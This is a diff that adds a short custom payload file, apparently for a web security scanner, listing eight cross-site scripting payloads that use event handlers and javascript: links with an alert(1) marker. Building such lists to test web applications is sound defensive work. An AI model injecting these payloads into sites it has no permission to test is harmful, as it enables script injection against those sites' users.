@@ -1,0 +1,10 @@
+# Custom XSS Payloads File
+# One payload per line, comments start with #
+<svg/onload=alert(1)>
+<body onpageshow=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<svg><animate onbegin=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)">
